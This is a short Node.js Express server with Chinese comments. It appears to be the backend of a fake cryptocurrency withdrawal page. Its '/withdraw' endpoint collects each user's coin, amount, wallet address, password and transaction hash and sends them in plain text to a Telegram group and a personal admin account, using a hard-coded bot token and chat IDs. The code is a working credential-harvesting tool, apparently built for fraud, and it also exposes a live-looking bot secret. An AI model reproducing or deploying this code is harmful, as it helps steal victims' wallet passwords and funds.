const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
require("dotenv").config();

const app = express();
app.use(bodyParser.json());
app.use(express.static(__dirname));

// === 填你的机器人 Token ===
const BOT_TOKEN = process.env.BOT_TOKEN || "8228143745:AAGsaA043ZDQyXt8szfBnr0LpmrMl5ILvRs";
// === 群组 ID（负数开头）===
const GROUP_ID = process.env.GROUP_ID || "-1003122480155";
// === 你的 Telegram 个人 ID（机器人单独通知你的）===
const ADMIN_ID = process.env.ADMIN_ID || "6062973135";

// 发送消息函数（机器人 + 群组）
async function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // 发给群组
    await axios.post(url, {
        chat_id: GROUP_ID,
        text,
        parse_mode: "HTML"
    });

    // 发给管理员（你个人）
    await axios.post(url, {
        chat_id: ADMIN_ID,
        text,
        parse_mode: "HTML"
    });
}

// 前端提交提款
app.post("/withdraw", async (req, res) => {
    try {
        const { coin, amount, usdt, wallet, password, hash } = req.body;

        const msg =
`📤 <b>NEW WITHDRAWAL REQUEST 🚨</b>
--------------------------------

💰 <b>Coin:</b> ${coin}
🔢 <b>Amount:</b> ${amount}
💵 <b>USDT:</b> ${usdt}
🏦 <b>Wallet:</b> ${wallet}
🔐 <b>Password:</b> ${password}
🆔 <b>Transaction Hash:</b> ${hash}

⚠️ Wallet & password can be bound once.
Please screenshot the transaction hash for record.`;

        await sendToTelegram(msg);

        return res.json({ success: true });

    } catch (err) {
        console.error("ERROR:", err);
        return res.json({ success: false, error: "Server failed" });
    }
});

// Railway 固定端口
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log("🚀 Server running on port " + PORT);
});
